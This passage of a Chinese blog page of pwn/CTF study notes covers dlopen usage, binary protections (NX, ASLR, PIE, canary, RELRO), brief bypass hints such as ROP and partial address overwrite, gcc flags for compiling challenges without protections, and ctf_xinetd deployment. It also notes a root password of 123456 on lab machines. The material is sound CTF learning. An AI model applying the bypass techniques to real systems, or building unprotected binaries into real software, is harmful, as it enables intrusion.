<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span><span class=cpf>&lt;dlfcn.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>pFunc</span><span class=p>)</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>str</span><span class=p>);</span> <span class=c1>// 函数指针
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>void</span> <span class=o>*</span><span class=n>phandle</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>phandle</span> <span class=o>=</span> <span class=nf>dlopen</span><span class=p>(</span><span class=s>&#34;./xxx.so&#34;</span><span class=p>,</span> <span class=n>RTLD_LAZY</span><span class=p>);</span> <span class=c1>// 打开动态链接库
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>pFunc</span> <span class=o>=</span> <span class=nf>dlsym</span><span class=p>(</span><span class=n>phandle</span><span class=p>,</span> <span class=s>&#34;func_name&#34;</span><span class=p>);</span> <span class=c1>// 获得函数地址直接使用pFunc
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>dlclose</span><span class=p>(</span><span class=n>phandle</span><span class=p>);</span> <span class=c1>// 关闭动态加载库
</span></span></span></code></pre></div></div><h3 id=c-1>C++</h3><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C++"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=n>vptr</span> <span class=o>=</span> <span class=k>operator</span> <span class=k>new</span><span class=p>(</span><span class=n>std</span><span class=o>::</span><span class=n>size_t</span> <span class=n>size</span><span class=p>);</span> <span class=c1>// 不调用构造函数，仅分配内存空间
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::</span><span class=n>basic_string</span><span class=p>(</span><span class=n>input</span><span class=p>);</span> <span class=c1>// 将input初始化为string对象
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>std</span><span class=o>::</span><span class=n>ostream</span><span class=o>::</span><span class=k>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>xxx</span><span class=p>);</span> <span class=c1>// 写入ostream
</span></span></span></code></pre></div></div><p><strong>文件</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C++"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=n>std</span><span class=o>::</span><span class=n>ofstream</span><span class=o>::</span><span class=n>basic_ofstream</span><span class=p>();</span>  <span class=c1>// 创建文件输出流, 写入文件
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>std</span><span class=o>::</span><span class=n>ofstream</span><span class=o>::</span><span class=n>is_open</span><span class=p>(</span><span class=s>&#34;xxx&#34;</span><span class=p>);</span> <span class=c1>// 判断是否打开文件
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=n>std</span><span class=o>::</span><span class=n>ifstream</span><span class=o>::</span><span class=n>basic_ifstream</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=s>&#34;xx&#34;</span><span class=p>,</span> <span class=mi>8LL</span><span class=p>);</span> <span class=c1>// 打开文件
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>std</span><span class=o>::</span><span class=n>ifstream</span><span class=o>::</span><span class=n>is_open</span><span class=p>(</span><span class=n>v</span><span class=p>)</span> <span class=p>)</span> <span class=c1>// 判断是否打开
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>std</span><span class=o>::</span><span class=n>istream</span><span class=o>::</span><span class=k>operator</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span> <span class=c1>// 将文件内容读取到内存地址a中
</span></span></span></code></pre></div></div><p><strong>虚函数</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c++"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=c1>// 虚函数占用类A对象内存空间
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>class</span> <span class=nc>A</span><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>public</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=c1>// void *vptr; // 虚函数表指针
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>virtual</span> <span class=kt>void</span> <span class=n>vfunc</span><span class=p>(){}</span>
</span></span><span class=line><span class=cl>	<span class=k>virtual</span> <span class=o>~</span><span class=n>A</span><span class=p>(){}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>A</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=n>vptr</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>A</span><span class=o>::</span><span class=n>vftable</span><span class=p>;</span> <span class=c1>// 编译阶段自动为构造函数加入, 使vptr指向类A的虚函数表virtual table
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>private</span><span class=o>:</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>a</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span></span></span></code></pre></div></div><img src=/img/pwn_note.zh-cn.assets/image-20241030225430193.png alt=图片无法加载><h3 id=python>Python</h3><p><strong>小的匿名函数</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>xx</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>arg1</span><span class=p>,</span><span class=n>arg2</span><span class=p>:</span><span class=n>expression</span>
</span></span><span class=line><span class=cl><span class=n>xx</span><span class=p>(</span><span class=n>x1</span><span class=p>,</span><span class=n>x2</span><span class=p>)</span></span></span></code></pre></div></div><p><strong>解释器</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=c1># 开头</span>
</span></span><span class=line><span class=cl><span class=c1>#!/usr/local/bin/python</span>
</span></span><span class=line><span class=cl><span class=ow>or</span>
</span></span><span class=line><span class=cl><span class=c1>#!/usr/bin/env python</span></span></span></code></pre></div></div><p><strong>调试器</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>python -m ipdb x.py
</span></span><span class=line><span class=cl><span class=c1># l: 显示所有代码  s: 单步调试  restart: 重启  c: 继续  q: 退出 b num: 下断点到 num 行</span>
</span></span><span class=line><span class=cl><span class=c1># p variable 查看变量值  p locals() 返回所有值的字典</span></span></span></code></pre></div></div><p><strong>检测器</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>pyflakes &lt;file.py&gt; <span class=c1># 可以检查错误</span>
</span></span><span class=line><span class=cl>mypy &lt;file.py&gt; <span class=c1># 静态类型检查器</span></span></span></code></pre></div></div><p><strong>性能分析</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>python -m cProfile -s tottime command.py 	<span class=c1># 使用cProfile分析, 总时间进行排序</span>
</span></span><span class=line><span class=cl>python -m memory_profiler x.py 				<span class=c1># 查看代码内存使用情况</span></span></span></code></pre></div></div><p><strong>字节串</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>s.replace<span class=o>(</span>b<span class=s1>&#39;a&#39;</span>, b<span class=s1>&#39;c&#39;</span><span class=o>)</span> <span class=c1># 字节串替换 a 替换为 c</span>
</span></span><span class=line><span class=cl>str_s.decode<span class=o>(</span><span class=s1>&#39;utf-8&#39;</span><span class=o>)</span>.strip<span class=o>(</span><span class=s1>&#39;x&#39;</span><span class=o>)</span> <span class=c1># 字节串转换为字符串, 并去除两端的&#39;x&#39;</span>
</span></span><span class=line><span class=cl>eval<span class=o>(</span>s_str<span class=o>)</span> <span class=c1># 执行字符串中的运算式</span></span></span></code></pre></div></div><h3 id=保护措施>保护措施</h3><p><strong>The NX bits</strong></p><p>No-eXecute，编译时决定是否生效，操作系统实现，在内存页的标识中增加“执行”位，可表示该内存页是否可以执行——无法向栈写 shellcode，栈不可执行，无法使用 shellcode，可利用 ROP 绕过</p><p><strong>ASLR</strong></p><p>Address Space Layout Randomization：地址空间分布随机化，系统级别随机化，影响 ELF 的加载地址，使得地址每次加载都随机不同</p><p>程序装载时生效</p><ul><li><code>/proc/sys/kernel/randomize_va_space = 0</code>：无随机化</li><li><code>/proc/sys/kernel/randomize_va_space = 1</code>：部分随机化，<strong>共享库、栈、mmap()、VDSO</strong>随机化</li><li><code>/proc/sys/kernel/randomize_va_space = 2</code>：完全随机化，部分随机化基础上，通过<code>brk()</code>分配的堆内存空间也随机化</li></ul><p>会在 For Kernel 下开始偏移随机的量，使得栈的起始地址随机</p><p><strong>PIE</strong></p><p>position-independent executable，地址无关可执行，每次加载程序时都变换加载地址，不开则加载到固定位置，针对主模块的随机，针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术</p><p>注：</p><ul><li><p>在 IDA 中会发现地址均为偏移地址，于是不能通过 ROPgadget 帮助解题</p></li><li><p>绕过：部分写地址，利用栈上已有的地址，只修改最后两个字节，因为地址最后三个数字就是实际地址的最后三个数字</p></li></ul><p><strong>区别</strong></p><ul><li>关闭 PIE<ul><li>关闭 ASLR：主模块加载地址固定（0x400000）所有模块加载地址固定</li><li>开启 ASLR：主模块加载地址固定（0x400000） 其他模块加载地址不固定</li></ul></li><li>开启 PIE<ul><li>关闭 ASLR：所有模块加载地址固定 主模块地址（主模块基址 0x55xxxxxxxxxx 且固定)</li><li>开启 ASLR：所有模块加载地址不固定</li></ul></li></ul><p><strong>Canary</strong></p><blockquote><p>有 canary 栈溢出无法执行，在函数入口处从 fs(32 位)/gs(64 位)寄存器偏移处读取一个值，实际读取 TLS 中的<code>stack_guard</code>，IDA 中可分析识别出 canary</p></blockquote><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>v4</span><span class=p>;</span>    <span class=c1>// [rsp+108h] [rbp-20h]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>v4</span> <span class=o>=</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span><span class=c1>//表示在栈上放置一个Canary
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>return</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>)</span> <span class=o>^</span> <span class=n>v4</span><span class=p>;</span><span class=c1>//为0才会通过检查
</span></span></span></code></pre></div></div><table><thead><tr><th>return address</th><th></th></tr></thead><tbody><tr><td>previous ebp</td><td>ebp</td></tr><tr><td>canary</td><td>执行 ret 前检查 canary</td></tr><tr><td>&mldr;&mldr;</td><td></td></tr><tr><td>s</td><td>esp</td></tr></tbody></table><p>若 Canary 值被改变，则会触发：<code>__stack_chk_fail</code> 函数</p><p><strong>RELRO</strong></p><p>（Relocation Read Only：重定位表（即.got 和.plt 表）只读）</p><p>No relro：got 表可写，（<code>init.array</code>、<code>fini.array</code>、<code>got.plt</code>均可读可写）</p><p>部分 relro：got 表可写，（<code>ini.array</code>、<code>fini.array</code>可读不可写，<code>got.plt</code>可读可写）</p><p>完全 relro：got 表不可写，只读，无法被覆盖，大大增加程序启动时间（均不可写）</p><p><strong>RWX</strong></p><p>checksec 查看<strong>可读可写可执行</strong>的区域：Has RWX segments</p><h3 id=问题解决>问题解决</h3><ul><li>报错：Unexpected entries in the PLT stub. The file might have been modified after linking</li></ul><p>下载 <a href=https://github.com/veritas501/pltresolver target=_blank rel="noopener noreffer">https://github.com/veritas501/pltresolver</a> 到 plugins 文件夹中，然后键盘输入 <code>Ctrl+Shift+J</code></p><ul><li>反汇编失败：Decompilation failure:8048998: call analysis failed</li></ul><p><code>Edit - Patch program - Assemble</code> 改为 nop</p><ul><li>报错如下：</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-JSON"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-JSON data-lang=JSON><span class=line><span class=cl><span class=err>W:</span> <span class=err>GPG</span> <span class=err>错误：https:</span><span class=c1>//mirrors.tuna.tsinghua.edu.cn/ubuntu bionic-security InRelease: 由于没有公钥，无法验证下列签名： NO_PUBKEY 3B4FE6ACC0B21F32
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>E:</span> <span class=err>仓库</span> <span class=err>“https:</span><span class=c1>//mirrors.tuna.tsinghua.edu.cn/ubuntu bionic-security InRelease” 没有数字签名。
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>N:</span> <span class=err>无法安全地用该源进行更新，所以默认禁用该源。</span></span></span></code></pre></div></div><p>解决: <code>sudo apt-key adv --keyserver ``keyserver.ubuntu.com`` --recv-keys 3B4FE6ACC0B21F32</code></p><h3 id=出题>出题</h3><p>gcc 编译 pwn 题时：</p><ul><li>NX：<strong>-z execstack / -z noexecstack</strong> (关闭 / 开启) 不让执行栈上的数据，于是 JMP ESP 就不能用了</li><li>Canary：<strong>-fno-stack-protector /-fstack-protector / -fstack-protector-all</strong> (关闭 / 开启 / 全开启) 栈里插入 cookie 信息</li><li>PIE：<strong>-no-pie / -pie</strong> (关闭 / 开启) 地址随机化，另外打开后会有 get_pc_thunk</li><li>RELRO：<strong>-z norelro / -z lazy / -z now</strong> (关闭 / 部分开启 / 完全开启) 对 GOT 表是否具有写权限</li><li>Arch：<strong>-m32</strong>对文件进行 32 位的编译，<strong>-m64</strong>进行 64 位编译</li></ul><p>使用<strong>ctf_xinetd 项目</strong>搭建部署 pwn 出题环境，尝试了多题部署但最终未能实现，于是转向单题部署且能打通 test1</p><p><strong>部署过程</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>git clone https://github.com/Eadom/ctf_xinetd
</span></span><span class=line><span class=cl><span class=c1>#把flag和二进制程序放入bin目录中，并且按照readme修改ctf.xinetd</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#在ctf_xinetd目录下构建容器</span>
</span></span><span class=line><span class=cl>docker build -t <span class=s2>&#34;pwn&#34;</span> .
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#运行该镜像(pub_port: 想要放置的端口)</span>
</span></span><span class=line><span class=cl>docker run -d -p <span class=s2>&#34;0.0.0.0:pub_port:9999&#34;</span> -h <span class=s2>&#34;pwn&#34;</span> --name<span class=o>=</span><span class=s2>&#34;pwn&#34;</span> pwn</span></span></code></pre></div></div><p><strong>相关命令</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl><span class=c1># 查看端口连接：</span>
</span></span><span class=line><span class=cl>sudo netstat -antp <span class=p>|</span> grep docker
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 查看连接所在进程：</span>
</span></span><span class=line><span class=cl>sudo lsof -i:<span class=o>[</span>port_number<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 断开连接：</span>
</span></span><span class=line><span class=cl>sudo <span class=nb>kill</span> -9 <span class=o>[</span>PID<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 关闭docker</span>
</span></span><span class=line><span class=cl>docker <span class=nb>kill</span> <span class=o>[</span>PID<span class=o>]</span></span></span></code></pre></div></div><p>出现镜像冲突</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>docker ps -a
</span></span><span class=line><span class=cl>docker rm <span class=o>[</span>CONTAINER ID<span class=o>]</span></span></span></code></pre></div></div><p><strong>2 台 pwn 机 su root 密码更改为了 123456</strong></p><p>出题时要考虑</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=nf>setbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>setbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span> <span class=c1>//手动刷新缓冲区，将缓冲区输出到屏幕
</span></span></span></code></pre></div></div><h2 id=elf-文件>ELF 文件</h2><p>Executable and Linking Format 可执行和链接的文件格式，其文件结构、常数、变量类型定义在<code>/usr/include/elf.h</code>中</p><table><thead><tr><th></th><th></th><th>可执行程序</th><th>动态链接库</th><th>静态链接库</th></tr></thead><tbody><tr><td>Windows</td><td>PE</td><td>.exe</td><td>.dll</td><td>.lib</td></tr><tr><td>Linux</td><td>ELF</td><td>.out</td><td>.so</td><td>.a</td></tr></tbody></table><p><strong>ELF 文件类型</strong></p><ul><li>可执行文件<code>ET_EXEC</code>：可直接执行，在操作系统运行</li><li>共享目标文件<code>ET_DYN</code>：可被动态链接的共享库，运行时与其他程序动态链接，后缀<code>.so</code></li><li>可重定位文件<code>ET_REL</code>：编译器生成的目标文件，用于将多个目标文件链接到一个可执行文件或共享库中，后缀<code>.o</code>，静态链接库<code>.a</code>也可归为该类</li><li>核心转储文件<code>ET_CORE</code>：操作系统在程序崩溃或错误生成的快照，用于调试</li></ul><img src=/img/pwn_note.zh-cn.assets/image-20241101184751998.png alt=图片无法加载><p><strong>文件头 ELF header</strong></p><p>记录 ELF 文件组织结构，32 位为例</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cm>/* The ELF file header.  This appears at the start of every ELF file.  */</span>
</span></span><span class=line><span class=cl><span class=cp>#define EI_NIDENT (16)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>e_ident</span><span class=p>[</span><span class=n>EI_NIDENT</span><span class=p>];</span> <span class=cm>/* Magic number and other info */</span>
</span></span><span class=line><span class=cl>	<span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>		1-4 bytes: ELFMAG即x7fELF
</span></span></span><span class=line><span class=cl><span class=cm>		5 byte: ELF文件类型-&gt;ELFCLASS32(1)32位, ELFCLASS64(2)64位
</span></span></span><span class=line><span class=cl><span class=cm>		6 byte: ELF字节序, 0无效格式, 1小端, 2大端
</span></span></span><span class=line><span class=cl><span class=cm>		7 byte: ELF版本, 1即1.2版本
</span></span></span><span class=line><span class=cl><span class=cm>		8-16 bytes: 无定义0
</span></span></span><span class=line><span class=cl><span class=cm>	*/</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Half</span>    <span class=n>e_type</span><span class=p>;</span>         <span class=cm>/* Object file type ELF 文件类型 */</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Half</span>    <span class=n>e_machine</span><span class=p>;</span>      <span class=cm>/* Architecture EM_开头*/</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Word</span>    <span class=n>e_version</span><span class=p>;</span>      <span class=cm>/* Object file version */</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Addr</span>    <span class=n>e_entry</span><span class=p>;</span>        <span class=cm>/* Entry point virtual address 程序入口*/</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* RVA:内存中地址相对于模块基址的偏移; FOA:文件中某数据相对于文件开头的偏移 */</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Off</span> <span class=n>e_phoff</span><span class=p>;</span>        <span class=cm>/* Program header table file offset 程序头表的文件偏移*/</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Off</span> <span class=n>e_shoff</span><span class=p>;</span>        <span class=cm>/* Section header table file offset 节表的文件偏移*/</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Word</span>    <span class=n>e_flags</span><span class=p>;</span>        <span class=cm>/* Processor-specific flags */</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Half</span>    <span class=n>e_ehsize</span><span class=p>;</span>       <span class=cm>/* ELF header size in bytes ELF文件头大小*/</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 程序头表
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>Elf32_Half</span>    <span class=n>e_phentsize</span><span class=p>;</span>        <span class=cm>/* Program header table entry size 每个表项大小*/</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Half</span>    <span class=n>e_phnum</span><span class=p>;</span>        <span class=cm>/* Program header table entry count 表项数量*/</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 节表
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>Elf32_Half</span>    <span class=n>e_shentsize</span><span class=p>;</span>        <span class=cm>/* Section header table entry size 每个表项大小*/</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Half</span>    <span class=n>e_shnum</span><span class=p>;</span>        <span class=cm>/* Section header table entry count 表项数量*/</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Half</span>    <span class=n>e_shstrndx</span><span class=p>;</span>     <span class=cm>/* Section header string table index 字符串表的索引*/</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>Elf32_Ehdr</span><span class=p>;</span></span></span></code></pre></div></div><p><strong>程序头表 Program header table</strong></p><p>告诉系统如何创建进程，可执行文件、共享库文件有，目标文件没有，由<code>Elf*_Phdr</code>组成的数组</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/* Program segment header.  */</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Word</span>    <span class=n>p_type</span><span class=p>;</span>         <span class=cm>/* Segment type */</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Off</span> <span class=n>p_offset</span><span class=p>;</span>       	  <span class=cm>/* Segment file offset */</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Addr</span>    <span class=n>p_vaddr</span><span class=p>;</span>        <span class=cm>/* Segment virtual address */</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Addr</span>    <span class=n>p_paddr</span><span class=p>;</span>        <span class=cm>/* Segment physical address ELF还没装载不知道物理地址作为保留字段, 通常和p_vaddr一样*/</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Word</span>    <span class=n>p_filesz</span><span class=p>;</span>       <span class=cm>/* Segment size in file */</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Word</span>    <span class=n>p_memsz</span><span class=p>;</span>        <span class=cm>/* Segment size in memory */</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Word</span>    <span class=n>p_flags</span><span class=p>;</span>        <span class=cm>/* Segment flags 可读可写可执行等*/</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf32_Word</span>    <span class=n>p_align</span><span class=p>;</span>        <span class=cm>/* Segment alignment */</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>Elf32_Phdr</span><span class=p>;</span></span></span></code></pre></div></div><p><strong>节头表 Section header table</strong></p><p>记录 ELF 节区信息，用于链接的目标文件必须拥有此结构，固定长度的<code>Elf*_Shdr</code>结构体数组用来存放节相关信息</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
